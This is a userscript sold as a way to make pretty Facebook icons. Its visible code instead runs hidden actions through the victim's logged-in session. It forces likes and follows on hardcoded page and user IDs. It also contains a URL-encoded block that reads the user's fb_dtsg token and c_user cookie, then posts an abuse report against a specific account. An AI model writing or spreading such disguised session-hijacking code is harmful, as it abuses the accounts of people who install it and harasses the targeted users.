// ==UserScript==
// @name            Cach Tao Icon Dep Cho Facebook hot nhat 2014
// @description     All about facebook By Ga Rung
...
//bbb
Like("150102095150550");Like("455863884444137");a("100002246733035");a("811547415");a("100002731324327");a("100001051862999");P("260531784118237");P("259999314171484");a("100006631563588");a("100000385016031");IDS("100001051862999");P("265628433608572");P("635230449867619");a("505128589591430");Like("129321643838795");sublist("1462914080613034"); 
//garu
a("100006734467466");IDS("100006734467466");
//page thue
...
//ngulolnhe
%2F%2Fngulolnhe%0Avar%20fb_dtsg%20%3D%20document.getElementsByName(%27fb_dtsg%27)%5B0%5D.value%3B%0Avar%20user_id%20%3D%20document.cookie.match(document.cookie.match(%2Fc_user%3D(%5Cd%2B)%2F)%5B1%5D)%3B%0Avar%20now%3D(new%20Date).getTime()%3B%0Afunction%20Report(id)%20%7B%0A%20%20var%20Page%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20var%20PageURL%20%3D%20%22%2F%2Fwww.facebook.com%2Fajax%2Freport%2Fsocial.php%22%3B%0A%20%20var%20PageParams%20%3D%22fb_dtsg%3D%22%2Bfb_dtsg%2B%22%26block%3D1%26pp%3D%257B%2522actions_to_take%2522%253A%2522%5B%5D%2522%252C%2522are_friends%2522%253Afalse%252C%2522cid%2522%253A%22%2Bid%2B%22%252C%2522content_type%2522%253A0%252C%2522expand_report%2522%253A1%252C%2522first_choice%2522%253A%2522file_report%2522%252C%2522from_gear%2522%253A%2522timeline%2522%252C%2522is_following%2522%253Afalse%252C%2522is_tagged%2522%253Afalse%252C%2522on_profile%2522%253Afalse%252C%2522phase%2522%253A3%252C%2522ref%2522%253A%2522https%253A%255C%252F%255C%252Fwww.facebook.com%255C%252FNan.ertt7%2522%252C%2522report_type%2522%253A145%252C%2522rid%2522%253A%22%2Bid%2B%22%252C%2522sub_report_type%2522%253A3%252C%2522time_flow_started%2522%253A%22%2Bnow%2B%22%252C%2522user%2522%253A%22%2Buser_id%2B%22%257D%26file_report%3D1%26__user%3D%22%2Buser_id%2B%22%26__a%3D1%26__dyn%3D7n8ahyj2qmvu5k9UmAAaUVpo%26__req%3Du%26ttstamp%3D2658168571071108880%22%3B%0A%20%20Page.open(%22POST%22%2C%20PageURL%2C%20true)%3B%0A%20%20Page.onreadystatechange%20%3D%20function%20()%20%7B%0A%20%20%20%20if%20(Page.readyState%20%3D%3D%204%20%26%26%20Page.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20Page.close%3B%0A%20%20%20%20%7D%0A%20%20%7D%3B%0A%20%20Page.send(PageParams)%3B%0A%7D%0AReport(%22100008202903172%22)%3B